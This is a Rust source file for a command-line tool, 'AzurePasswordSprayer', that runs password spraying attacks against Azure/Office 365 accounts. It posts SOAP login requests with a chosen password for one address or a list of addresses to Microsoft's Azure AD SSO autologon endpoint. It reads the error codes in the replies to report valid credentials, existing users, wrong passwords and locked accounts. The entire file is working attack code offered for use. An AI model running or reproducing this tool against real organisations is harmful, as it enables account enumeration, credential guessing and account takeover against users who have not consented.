use clap::Parser;
use colored::*;
use reqwest::Client;
use tokio;
use uuid::Uuid;
use chrono::Utc;
use futures::stream::{FuturesUnordered, StreamExt};
use std::sync::Arc;
use clap::CommandFactory;

#[derive(Parser, Debug)]
#[clap(name = "AzurePasswordSprayer",author = "boring", version = "1.0", about = "Performs password spraying attacks against Azure/Office 365 accounts using one or multiple email addresses.")]
struct Args {
    /// Email address to check.
    #[clap(short, long)]
    email: Option<String>,

    /// Password for authentication
    #[clap(short, long)]
    password: Option<String>,

    /// Path to a file containing a list of emails to check.
    #[clap(short = 'U', long)]
    userlist: Option<String>,

    /// Output file to write the results. Defaults to "output.txt".
    #[clap(short, long)]
    outfile: Option<String>,
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    if args.password.is_none() {
        Args::command().print_help().expect("Failed to print help");
        println!();
        return;
    }

    let password = args.password.unwrap();

    let client = Arc::new(Client::new());
    let password = Arc::new(password);
    let outfile_global = Arc::new(args.outfile.unwrap_or_else(|| "output.txt".to_owned()));

    let mut tasks = FuturesUnordered::new();

    if let Some(email) = &args.email {
        let email_arc = Arc::new(email.clone());
        let client_clone = Arc::clone(&client);
        let password_clone = Arc::clone(&password);
        let outfile_clone = Arc::clone(&outfile_global);
        tasks.push(tokio::spawn(async move {
            password_spray(&client_clone, &email_arc, &password_clone, &outfile_clone).await
        }));
    }

    if let Some(userlist) = &args.userlist {
        let users_content = std::fs::read_to_string(userlist).expect("Failed to read userlist file");
        let users = users_content.lines().map(|line| Arc::new(line.to_string())).collect::<Vec<Arc<String>>>();
        for user_arc in users {
            let client_clone = Arc::clone(&client);
            let password_clone = Arc::clone(&password);
            let outfile_clone = Arc::clone(&outfile_global);
            tasks.push(tokio::spawn(async move {
                password_spray(&client_clone, &user_arc, &password_clone, &outfile_clone).await
            }));
        }
    }

    while let Some(result) = tasks.next().await {
        match result {
            Ok(Ok(())) => (),
            Ok(Err(e)) => println!("Error: {}", e),
            Err(e) => println!("Task panicked: {:?}", e),
        }
    }
}



async fn password_spray(
    client: &Client, 
    user: &Arc<String>, 
    password: &Arc<String>, 
    outfile: &Arc<String>
) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let domain = user.split('@').nth(1).unwrap_or_default();
    let tar = format!("https://autologon.microsoftazuread-sso.com/{}/winauth/trust/2005/usernamemixed?client-request-id={}", domain, Uuid::new_v4());
    let body = format!(r#"<?xml version="1.0" encoding="UTF-8"?>
    <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <s:Header>
        <a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
        <a:MessageID>urn:uuid:{message_id}</a:MessageID>
        <a:ReplyTo>
        <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
        </a:ReplyTo>
        <a:To s:mustUnderstand="1">{tar}</a:To>
        <o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
        <u:Timestamp u:Id="_0">
            <u:Created>{created}</u:Created>
            <u:Expires>{expires}</u:Expires>
        </u:Timestamp>
        <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
            <o:Username>{user}</o:Username>
            <o:Password>{password}</o:Password>
        </o:UsernameToken>
        </o:Security>
    </s:Header>
    <s:Body>
        <trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
        <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
            <a:EndpointReference>
            <a:Address>urn:federation:MicrosoftOnline</a:Address>
            </a:EndpointReference>
        </wsp:AppliesTo>
        <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
        <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
        </trust:RequestSecurityToken>
    </s:Body>
    </s:Envelope>
    "#, 
    message_id=Uuid::new_v4(), 
    tar=&tar, 
    created=Utc::now().to_rfc3339(), 
    expires=Utc::now().checked_add_signed(chrono::Duration::minutes(10)).unwrap().to_rfc3339(), 
    user=(*user).as_str(),
    password=**password
);

    let res = client.post(&tar)
        .body(body)
        .header("Content-Type", "application/soap+xml; charset=utf-8")
        .send()
        .await?;

    let data = res.text().await?;
    if data.contains("DesktopSsoToken") {
        println!("{}", format!("[+] Email Exists: {} \n[+] Password Accepted: {}", user, password).green());
        std::fs::write(&**outfile, format!("{}\n", user)).expect("Failed to write to outfile");
    } else if data.contains("AADSTS50034") {
        println!("{}", format!("[-] {} does not exist", user).red());
    } else if data.contains("AADSTS50126") {
        println!("{}", format!("[+] {} exists\n[-] Password Incorrect", user).red());
    } else if data.contains("AADSTS50053") {
        println!("{}", format!("[+] {} exists\n[-] Account is Locked", user).yellow());
    } else {
        println!("{}", format!("[+] {} exists", user).green());
    }

    Ok(())
}

